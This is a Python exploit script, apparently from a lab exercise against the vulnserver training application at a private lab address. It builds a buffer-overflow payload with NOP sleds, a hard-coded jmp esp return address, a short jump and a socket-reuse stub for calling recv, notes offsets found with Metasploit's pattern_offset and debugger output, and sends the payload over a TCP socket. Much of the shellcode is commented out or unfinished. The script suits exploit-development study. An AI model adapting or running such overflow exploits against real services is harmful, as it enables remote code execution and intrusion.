
#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit
from time import sleep

# CONSTANTS
rhost = "10.10.11.11"
rport = 4321
target = (rhost, rport)
timeout_val = 10  # seconds


#00B6FA0C   0000007C  |...  |Socket = 7C
#00401953  |. E8 D40B0000    |CALL <JMP.&WS2_32.recv>                 ; \recv
#CALL 0040252C


#EIP is at 00B6FA0C when initial stop at breakpoint
#closest address of file descriptor?
#

#00B6F78F   007C00 00        ADD BYTE PTR DS:[EAX+EAX],BH
#00B6FB93   007C00 00        ADD BYTE PTR DS:[EAX+EAX],BH


#Enter Address #1: 00B6FA0C
#Enter Address #2: 00B6F78F
#[+] Hex offset: 0x27d
#[+] Decimal offset: 637

#Enter Address #1: 00B6FA0C
#Enter Address #2: 00B6FB93
#[+] Hex offset: 0x187
#[+] Decimal offset: 391

#00B6F9C6   54               PUSH ESP
#00B6F9C7   59               POP ECX
#00B6F9C8   66:81C1 8701     ADD CX,187


exploit = b"HELP "
exploit += b"\x90" * 7


 #   b"\x54"  # PUSH ESP
  #  b"\x59"  # POP ECX
   # b"\x66\x81\xC1\x87\x01"  # ADD CX,187
#)
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
#exploit += b"\x90" * (66 - len(exploit))

#exploit = b"A" * 66
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll]
# ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
# \\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll
#exploit += pack("<L", 0x7c82385d)
#exploit += pack("<L", 0x7c82385d)
exploit += b'\x5d\x38\x82\x7c'



# 00B7FA0C  ^EB B8            JMP SHORT 00B7F9C6
# JMP -72 (decimal) bytes

#exploit = (
 #   b"\x54"                     # PUSH ESP
  #  b"\x59"                     # POP ECX
   # b"\x66\x81\xC1\x87\x01"     # ADD CX,187
    #b"\x33\xD2"                 # XOR EDX,EDX
  #  b"\x52"                     # PUSH EDX 
    #b"\x80\xC6\x02"             # ADD DH,2
    #b"\x52"                     # PUSH EDX
   # b"\x54"                     # PUSH ESP
   # b"\x5A"                     # POP EDX
   # b"\x80\xEA\x2A"             # SUB DL,2A
   # b"\x52"                     # PUSH EDX
  #  b"\xFF\x31"                 # PUSH DWORD PTR DS:[ECX]
  #  b"\xE8\x4B\x2B\x88\xFF"     # CALL <JMP.&WS2_32.recv>
#)
#exploit += b"\B" * 4
#payload = []

exploit += b"\x90" * 10

payload = (
    b"\x54"  # PUSH ESP
    b"\x59"  # POP ECX
    b"\x66\x81\xC1\x21\x05"  # ADD CX,187
)
#EXPLOIT PAYLOAD GOES HERE


#exploit += payload
#42 appears t
exploit += payload
exploit += b"\x90" * (20 - len(payload))
exploit += b"\xCC" * (2 - len(payload))
exploit += b"(" 
#exploit += b"\xCC" * (49 - len(payload))

#exploit += b"\x90" * (49 - len(payload))
#exploit += b"\x90" * 18
#
print(exploit)

#CALL 0040252C

#payload = b"KSTET /.:/"
#payload += exploit

if __name__ == '__main__':
    print('[*] creating the socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the target')
        s.connect(target)
        print('[*] sending exploit')
        s.send(exploit)
        print('[*] sending out payload value')
        sleep(1)
    #    s.send(b"\xCC" * 512)

        print('[*] cleaning up')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, have you tried:')
        print('\t* ensure the debugger is not in a paused state')
        print('\t* checking if the VM is connected to the right virt network?')
        exit(1)
    except error:
        print('[!] a socket error occurred, is the host up?')
        exit(1)
    except KeyboardInterrupt:
        print()  # drop us below the ^C
        print('[!] user initiated cancel, exiting...')
        exit(1)